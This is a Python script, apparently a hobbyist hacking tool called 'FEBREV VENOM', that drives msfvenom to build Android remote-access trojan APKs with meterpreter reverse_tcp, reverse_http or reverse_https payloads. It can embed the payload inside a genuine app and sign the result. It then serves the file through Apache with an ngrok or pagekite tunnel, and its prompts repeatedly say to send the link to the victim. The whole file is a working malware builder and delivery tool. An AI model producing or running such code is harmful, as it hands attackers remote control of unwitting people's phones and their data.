import os
import webbrowser
print("""
  ______ ______ ____  _____  ________      __ __      ________ _   _  ____  __  __ 
 |  ____|  ____|  _ \|  __ \|  ____\ \    / / \ \    / /  ____| \ | |/ __ \|  \/  |
 | |__  | |__  | |_) | |__) | |__   \ \  / /   \ \  / /| |__  |  \| | |  | | \  / |
 |  __| |  __| |  _ <|  _  /|  __|   \ \/ /     \ \/ / |  __| | . ` | |  | | |\/| |
 | |    | |____| |_) | | \ \| |____   \  /       \  /  | |____| |\  | |__| | |  | |
 |_|    |______|____/|_|  \_\______|   \/         \/   |______|_| \_|\____/|_|  |_|
                                                                                   
                                                                                                                                        
                                                                 
                     =====>>> coded by FEBIN REV                                                                                             
     
 """)
print("""[1]android/meterpreter/reverse_tcp
[2]android/meterpreter/reverse_http
[3]android/meterpreter/reverse_https

""")
payload=int(input("ENTER THE SERIAL OF THE PAYLOAD YOU WANNA USE : "))
output=input("ENTER THE PATH OF YOUR OUTPUT APK (example : /root/Desktop)[note: dont use ' / ':at the end of path] : ")
name=input("ENTER THE NAME OF YOUR RAT APK(example: rat.apk) : ")
lhost=input("ENTER YOUR IP ADDRESS(lhost) : ")
lport=input("ENTER YOUR LISTENER PORT(lport) : ")
def venom():
    if payload==1:
        bind=input("DO YOU WANT TO BIND YOUR APK WITH OTHER APP [Y/n] : ")
        if bind=="Y" or bind=="Y":
            realapp=input("ENTER THE PATH OF THE ORIGINAL APK : ")
            if os.path.exists(realapp):
                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {output}/{name} ")
                print("SIGNING YOUR APK>>>>>>")
                os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
                print("D--O--N--E...........!!!!!!")
            else:
                print("ERROR : cannot find the path of the app by FEBREV_VENOM.!!!!!!!!")
                print("failed........!!!!!!!")
        elif bind=="n" or bind=="N":
            os.system(f"msfvenom -p android/meterpreter/reverse_tcp lhost={lhost} lport={lport} > {output}/{name}")
            print("SIGNING YOUR APK>>>>>>")
            os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
            print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")

        else:
            print("INVALID INPUT>>>>>>!!!!!")

    elif payload==2:
        bind = input("DO YOU WANT TO BIND YOUR APK WITH OTHER APP [Y/n] : ")
        if bind == "Y" or bind == "Y":
            realapp = input("ENTER THE PATH OF THE ORIGINAL APK : ")
            if os.path.exists(realapp):
                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_http lhost={lhost} lport={lport} > {output}/{name} ")
                print("SIGNING YOUR APK>>>>>>")
                os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
                print("D--O--N--E...........!!!!!!")
            else:
                print("ERROR : cannot find the path of the app by FEBREV_VENOM.!!!!!!!!")
                print("failed........!!!!!!!")
        elif bind == "n" or bind == "N":
            os.system(f"msfvenom -p android/meterpreter/reverse_http lhost={lhost} lport={lport} > {output}/{name}")
            print("SIGNING YOUR APK>>>>>>")
            os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
            print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")

        else:
            print("INVALID INPUT>>>>>>!!!!!")

    elif payload==3:
        bind = input("DO YOU WANT TO BIND YOUR APK WITH OTHER APP [Y/n] : ")
        if bind == "Y" or bind == "Y":
            realapp = input("ENTER THE PATH OF THE ORIGINAL APK : ")
            if os.path.exists(realapp):
                os.system(f"msfvenom -x {realapp} -p android/meterpreter/reverse_https lhost={lhost} lport={lport} > {output}/{name} ")
                print("SIGNING YOUR APK>>>>>>")
                os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
                print("D--O--N--E...........!!!!!!")
            else:
                print("ERROR : cannot find the path of the app by FEBREV_VENOM.!!!!!!!!")
                print("failed........!!!!!!!")
        elif bind == "n" or bind == "N":
            os.system(f"msfvenom -p android/meterpreter/reverse_https lhost={lhost} lport={lport} > {output}/{name}")
            print("SIGNING YOUR APK>>>>>>")
            os.system(f"apksigner sign -key febrev.pk8 -cert febrev.x509.pem {output}/{name}")
            print(f"{name} RAT apk CREATED SUCCESSFULLY IN {output} ")

        else:
            print("INVALID INPUT>>>>>>!!!!!")
            print("exiting.......please rerun the tool")

    else:
        print("PLEASE SELECT A PAYLOAD.............!!!")
        print("exiting......")


    server=input("DO YOU WANT TO SEND YOUR PAYLOAD VIA A LINK? [Y/n] : ")
    if server=="Y" or server=="y":
      print("[1]generate link through ngrok")
      print("[2]generate link through pagekite( the best method)")
      link=int(input("ENTER YOUR CHOICE : "))
      if link==1:
            os.system(f"cp {output}/{name} /var/www/html")
            print("SERVER STARTED......")
            print(f" COPY THE LINK BELOW AND ADD ' /{name}  AND SEND THE LINK URL TO YOUR VICTIM")
            print(f" <link>/{name}  ")
            print(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}")
            ack=input("do you understand?? : ")
            os.system("service apache2 start")
            ngrok=input("DO YOU HAVE AN ACCOUNT IN NGROK? [Y/n]....: ")
            if ngrok=="n" or ngrok=="N":
                  print(" ##### PLEASE ENTER THE AUTHTOKEN OF YOUR ACCOUNT#####")
                  webbrowser.open("https://dashboard.ngrok.com/signup")
                  auth=input(" ENTER THE STRING AUTHTOKEN ALONE(without './ngrok authtoken 'phrase : ")
                  os.system(f"./ngrok authtoken {auth}")
                  os.system("./ngrok http 80")
            
            else:
                  print("YOUR SYSTEM IS NOT CONFIGURED NGROK PROPERLY...")
                  print("PLEASE LOGIN YOUR NGROK ACCOUNT AND COPY THE AUTHTOKEN ALONE :")
                  input("ENTER TO CONTINUE , LOGIN :")
                  webbrowser.open("https://dashboard.ngrok.com/login")
                  auth2=input("ENTER THE AUTHTOKEN STRING ALONE : ")
                  os.system(f"./ngrok authtoken {auth2}")
                  input(f"send the ngrok link/{name} and send to the victim..!!('enter to continue!)")
                  input(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}(enter to continue)")
                  os.system("./ngrok http 80")
                         
      elif link==2:
           os.system(f"cp {output}/{name} /var/www/html")
           print("INSTALLING PAGEKITE FOR YOU>>>>")
           os.system("sudo apt-get install pagekite")
           pkname=input("ENTER ANY NAME TO YOUR DOMAIN OF THE LINK (Eg; febrev) : ")
           print(" ENTER THE CORRECT MAIL ID and A PASSWORD FOR REGISTERING in PAGEKITE")
           print(" ONCE THE DOMAIN IS REGISTERED THEN IT WONT BE CHANGED.....!so REMEMBER THE NAME OF DOMAIN")
           print("###SERVER STARTED###")
           print(" ")
           print(f" SEND THIS LINK TO THE VICTIM ====>>>>   pagekite {pkname}.pagekite.me/{name}")
           print("  ")
           print(" ")
           print(" ")
           os.system("service apache2 start")
           os.system(f"pagekite {pkname}.pagekite.me")
      else:
           print("NO INPUT ENTERED BY USER,,,,,,USING DEFAULT using NGROK....")
           os.system(f"cp {output}/{name} /var/www/html")
           print("SERVER STARTED......")
           print(f" COPY THE LINK BELOW AND ADD ' /{name}  AND SEND THE LINK URL TO YOUR VICTIM")
           print(f" <link>/{name}  ")
           print(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}")
           ack=input("do you understand?? : ")
           os.system("service apache2 start")
           ngrok=input("DO YOU HAVE AN ACCOUNT IN NGROK? [Y/n]....: ")
           if ngrok=="n" or ngrok=="N":
                 print(" ##### PLEASE ENTER THE AUTHTOKEN OF YOUR ACCOUNT#####")
                 webbrowser.open("https://dashboard.ngrok.com/signup")
                 auth=input(" ENTER THE AUTHTOKEN STRING ALONE(without './ngrok authtoken' phrase : ")
                 os.system(f"./ngrok authtoken {auth}")
                 os.system("./ngrok http 80")
           else:
               print("NICE , you have an account in ngrok...")
               if os.path.isfile("/root/.ngrok2/ngrok.yml"):
                   print(f"send the ngrok link/{name} and send to the victim..!!")
                   print(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}")
                   os.system("./ngrok http 80")
               else:
                   print("YOUR SYSTEM IS NOT CONFIGURED NGROK PROPERLY...")
                   print("PLEASE LOGIN YOUR NGROK ACCOUNT AND COPY THE AUTHTOKEN ALONE :")
                   input("ENTER TO CONTINUE , LOGIN :")
                   webbrowser.open("https://dashboard.ngrok.com/login")
                   auth2=input("ENTER THE AUTHTOKEN STRING ALONE : ")
                   os.system(f"./ngrok authtoken {auth2}")
                   input(f"send the ngrok link/{name} and send to the victim..!!('enter to continue!)")
                   input(f" FOR EXAMPLE : ===>> https://1234abc45d.ngrok.io/{name}(enter to continue)")
                   os.system("./ngrok http 80")
                         
    elif server=="n" or server=="N":
        exiting=input("ANY KEY TO EXIT....")
        print("##########  HAPPY HACKING ###########")
   
        



if __name__=="__main__":
    venom()
    
